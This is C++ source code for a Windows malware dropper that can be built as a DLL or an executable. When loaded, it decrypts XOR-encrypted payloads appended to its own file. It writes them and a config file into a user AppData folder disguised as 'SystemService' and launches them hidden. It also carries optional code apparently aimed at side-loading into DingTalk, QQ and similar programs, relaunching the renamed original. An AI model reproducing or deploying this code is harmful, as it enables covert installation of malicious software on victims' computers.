
#include <windows.h>
#include <iostream>
#include <lm.h>
#include "winternl.h"  
#include <Dbghelp.h>
#include "unbind.h"
#include "export.h"
#include <string>

using namespace std;

using namespace std;

#pragma comment(lib,"netapi32.lib")
#pragma comment(lib,"dbghelp.lib")


//#define RUN_OTHER
#define ONLY_RUNEXE

#define CRYPT_KEY_SIZE			16
#define SYSTEM_VERSION_WIN9X	1
#define SYSTEM_VERSION_WIN2000	2
#define SYSTEM_VERSION_XP		3
#define SYSTEM_VERSION_VISTA	4
#define SYSTEM_VERSION_WIN7		5
#define SYSTEM_VERSION_WIN8		6
#define SYSTEM_VERSION_WIN10	7
#define SYSTEM_VERSION_UNKNOW	8

unsigned long gHinstance = 0;

#define FIRSTRUN_COMMAND "STARTFIRSTTIME"

#define LOG_FILENAME	"log.log"

#define CONFIG_FILENAME "config.dat"

//rundll32.exe user32.dll, LockWorkStation
//rundll32 url.dll, FileProtocolHandler http ://www.baidu.com


void CryptData(unsigned char* pdata, int size, unsigned char* pkey, int keylen) {

	for (int i = 0, j = 0; i < size;)
	{
		pdata[i] ^= pkey[j];
		j++;
		if (j == keylen)
		{
			j = 0;
		}
		i++;
	}
}




int GetUserAndComputerName(char* szUsername, char* szComputerName)
{
	DWORD dwSize = MAX_PATH;
	int iRet = GetUserNameA(szUsername, &dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	dwSize = MAX_PATH;
	iRet = GetComputerNameA(szComputerName, &dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	return TRUE;
}

int GetWindowsVersion()
{
	WKSTA_INFO_100* wkstaInfo = NULL;
	NET_API_STATUS netStatus = NetWkstaGetInfo(NULL, 100, (LPBYTE*)&wkstaInfo);
	if (netStatus == NERR_Success)
	{
		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
		DWORD dwMinVer = wkstaInfo->wki100_ver_minor;
		DWORD dwVersion = (DWORD)MAKELONG(dwMinVer, dwMajVer);
		netStatus = NetApiBufferFree(wkstaInfo);

		int iSystemVersion = 0;
		if (dwVersion < 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN9X;
		}
		else if (dwVersion == 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN2000;
		}
		else if (dwVersion > 0x50000 && dwVersion < 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_XP;
		}
		else if (dwVersion == 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_VISTA;
		}
		else if (dwVersion == 0x60001)
		{
			iSystemVersion = SYSTEM_VERSION_WIN7;
		}
		else if (dwVersion >= 0x60002 && dwVersion <= 0x60003)
		{
			iSystemVersion = SYSTEM_VERSION_WIN8;
		}
		else if (dwVersion >= 0x60003 || dwVersion >= 0x100000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN10;
		}
		else
		{
			iSystemVersion = SYSTEM_VERSION_UNKNOW;
		}
		return iSystemVersion;
	}

	return FALSE;
}

int fileWriter(const char* fn, char* lpbuf, int filesize, int append) {
	FILE* fp = 0;
	if (append)
	{
		fp = fopen(fn, "ab+");
	}
	else {
		fp = fopen(fn, "wb");
	}

	if (fp <= 0) {
		return FALSE;
	}

	int ret = fwrite(lpbuf, 1, filesize, fp);
	fclose(fp);
	return ret;
}




int fileReader(char* fn, char** lpbuf, int* filesize) {
	FILE* fp = fopen(fn, "rb");
	if (fp <= 0) {
		return FALSE;
	}

	fseek(fp, 0, FILE_END);
	*filesize = ftell(fp);
	fseek(fp, 0, FILE_BEGIN);
	if (*filesize <= 0)
	{
		return FALSE;
	}

	*lpbuf = new char[*filesize + 1024];

	int ret = fread(*lpbuf, 1, *filesize, fp);
	*(*lpbuf + *filesize) = 0;
	fclose(fp);
	return ret;
}


int release(unsigned long hinst) {

	char szout[1024];

	char szUserName[MAX_PATH] = { 0 };
	char szComputerName[MAX_PATH] = { 0 };
	int iRet = GetUserAndComputerName(szUserName, szComputerName);
	int iSystemVersion = GetWindowsVersion();

	char  LITTLEBEARNAME[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };

	char szDstPathWin7[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\','l','o','c','a','l','\\','%','s','\\',0 };
	char szDstPathXP[] = { 'C',':','\\','D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s','\\','%','s','\\','L','o','c','a','l',' ','S','e','t','t','i','n','g','s','\\','%','s','\\',0 };

	char szSysDir[MAX_PATH] = { 0 };
	iRet = GetSystemDirectoryA(szSysDir, MAX_PATH);
	szDstPathWin7[0] = szSysDir[0];
	szDstPathXP[0] = szSysDir[0];

	char szDstPath[MAX_PATH] = { 0 };
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		wsprintfA(szDstPath, szDstPathWin7, szUserName, LITTLEBEARNAME);
	}
	else {
		wsprintfA(szDstPath, szDstPathXP, szUserName, LITTLEBEARNAME);
	}

	wsprintfA(szout, "release set dst path:%s\r\n", szDstPath);
	//fileWriter(LOG_FILENAME, szout, lstrlenA(szout),TRUE);

	iRet = MakeSureDirectoryPathExists(szDstPath);
	if (iRet == FALSE)
	{
		iRet = GetLastError();
		wsprintfA(szout, "MakeSureDirectoryPathExists file:%s error code:%u\r\n", szDstPath, iRet);
		fileWriter(LOG_FILENAME, szout, lstrlenA(szout), TRUE);
		return FALSE;
	}

	char szfarther[MAX_PATH] = { 0 };
	char szfn[MAX_PATH] = { 0 };
#ifdef _WINDLL
	iRet = GetModuleFileNameA((HMODULE)hinst, szfn, MAX_PATH);
	iRet = GetModuleFileNameA(0, szfarther, MAX_PATH);
#else
	iRet = GetModuleFileNameA((HMODULE)hinst, szfn, MAX_PATH);
	lstrcpyA(szfarther, szfn);
#endif

	int filesize = 0;
	char* lpbuf = 0;
	iRet = fileReader(szfn, &lpbuf, &filesize);
	if (iRet == FALSE)
	{
		wsprintfA(szout, "read file:%s error\r\n", szfn);
		fileWriter(LOG_FILENAME, szout, lstrlenA(szout), TRUE);
		return FALSE;
	}

	int offset = filesize - CRYPT_KEY_SIZE;
	unsigned char* key = (unsigned char*)lpbuf + offset;

	offset -= sizeof(int);
	int outfnlen = *(int*)(lpbuf + offset);

	offset -= outfnlen;
	char outfn[MAX_PATH] = { 0 };
	memcpy(outfn, lpbuf + offset, outfnlen);

	CryptData((unsigned char*)outfn, outfnlen, key, CRYPT_KEY_SIZE);

	offset -= sizeof(int);
	int outflen = *(int*)(lpbuf + offset);

	offset -= outflen;

	string outfpath = string(szDstPath) + string(outfn);
	CryptData((unsigned char*)lpbuf + offset, outflen, key, CRYPT_KEY_SIZE);
	iRet = fileWriter(outfpath.c_str(), lpbuf + offset, outflen, FALSE);


	offset -= sizeof(int);
	int outfn2len = *(int*)(lpbuf + offset);

	offset -= outfn2len;
	char outfn2[MAX_PATH] = { 0 };
	memcpy(outfn2, lpbuf + offset, outfn2len);

	CryptData((unsigned char*)outfn2, outfn2len, key, CRYPT_KEY_SIZE);

	offset -= sizeof(int);
	int outflen2 = *(int*)(lpbuf + offset);

	offset -= outflen2;

	string outfpath2 = string(szDstPath) + string(outfn2);
	CryptData((unsigned char*)lpbuf + offset, outflen2, key, CRYPT_KEY_SIZE);
	iRet = fileWriter(outfpath2.c_str(), lpbuf + offset, outflen2, FALSE);

	offset -= 64;
	CryptData((unsigned char*)lpbuf + offset, 64, key, CRYPT_KEY_SIZE);
	string cfgfn = string(szDstPath) + CONFIG_FILENAME;
	iRet = fileWriter(cfgfn.c_str(), lpbuf + offset, 64, FALSE);

#ifdef ONLY_RUNEXE
	if (outfpath2.find(".exe") != -1 || outfpath2.find(".com") != -1)
	{
		//string cmd2 = "cmd /c " + outfpath2;
		//iRet = WinExec(cmd2.c_str(), SW_HIDE);

		//could not run in DllMain
		//string param = string(FIRSTRUN_COMMAND) + " \"" +szfarther +"\"";
		//HINSTANCE hinst = ShellExecuteA(0, "open", outfpath2.c_str(), param.c_str(),0, SW_HIDE);

		string cmd = "\"" + outfpath2 + "\"" + " " + string(FIRSTRUN_COMMAND) + " \"" + szfarther + "\"";
		iRet = WinExec(cmd.c_str(), SW_HIDE);

		//iRet = GetLastError();
		wsprintfA(szout, "run file:%s result:%u\r\n", outfpath2.c_str(), iRet);
		//fileWriter(LOG_FILENAME, szout, lstrlenA(szout), TRUE);
	}
	else if (outfpath.find(".exe") != -1 || outfpath.find(".com") != -1)
	{
		//string cmd = "cmd /c " + outfpath;
		//iRet = WinExec(cmd.c_str(), SW_HIDE);

		//could not run in DllMain
		//string param = string(FIRSTRUN_COMMAND) + " \"" + szfarther + "\"";
		//HINSTANCE hinst = ShellExecuteA(0, "open",outfpath.c_str(), param.c_str(),0, SW_HIDE);

		string cmd = "\"" + outfpath + "\"" + " " + string(FIRSTRUN_COMMAND) + " \"" + szfarther + "\"";
		iRet = WinExec(cmd.c_str(), SW_HIDE);

		//iRet = GetLastError();
		wsprintfA(szout, "run file:%s result:%u\r\n", outfpath.c_str(), iRet);
		//fileWriter(LOG_FILENAME, szout, lstrlenA(szout), TRUE);
	}

#ifdef RUN_OTHER
	iRet = runOther();
#endif

#else
	string cmd = "cmd /c " + outfpath;
	iRet = WinExec(cmd.c_str(), SW_HIDE);

	string cmd2 = "cmd /c " + outfpath2;
	iRet = WinExec(cmd2.c_str(), SW_HIDE);
#endif

	//fileWriter(LOG_FILENAME, "work complete\r\n", lstrlenA("work complete\r\n"), TRUE);

	delete[]lpbuf;
	return iRet;
}


#ifdef RUN_OTHER
int runOther() {
	int ret = 0;
	char szcurfn[MAX_PATH] = { 0 };
	ret = GetModuleFileNameA(0, szcurfn, MAX_PATH);
	string newfn = string(szcurfn) + "_old.exe";

	if (strstr(szcurfn, "DownloadSDKServer.exe"))
	{

	}
	else if (strstr(szcurfn, "DingTalk.exe"))
	{
		newfn = string(szcurfn);

		string newddpath = "current_new";
		string oldddpath = "current";
		int pos = newfn.find(newddpath);
		if (pos >= 0)
		{
			newfn = newfn.replace(pos, newddpath.length(), oldddpath);
		}
	}
	else if (strstr(szcurfn, "QQ.exe"))
	{
		newfn = string(szcurfn) + "_old.dll";
		return 0;

	}
	else if (strstr(szcurfn, "minibrowser.exe"))
	{
		newfn = string(szcurfn) + "_old.exe";
	}

	string cmd = "cmd /c " + newfn;
	ret = WinExec(cmd.c_str(), SW_HIDE);
	return 0;
}
#endif


//WIN32 and win64
//_WINDOWS and _console
//typedef HINSTANCE HMODULE;      /* HMODULEs can be used in place of HINSTANCEs */
#ifdef _WINDLL
extern "C" __declspec(dllexport) int __stdcall DllMain(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {

	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		gHinstance = (unsigned long)hInstance;
		int ret = release(gHinstance);
	}
	else if (fdwReason == DLL_PROCESS_DETACH)
	{

	}

	return TRUE;
}
#else
int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	gHinstance = (unsigned long)hInstance;
	int ret = release(gHinstance);
	return TRUE;
}
#endif




extern "C" __declspec(dllexport) int __stdcall DllEntryPoint(_In_ HINSTANCE hInstance, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {

	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		gHinstance = (unsigned long)hInstance;
		int ret = release(gHinstance);
	}
	else if (fdwReason == DLL_PROCESS_DETACH)
	{

	}

	return TRUE;
}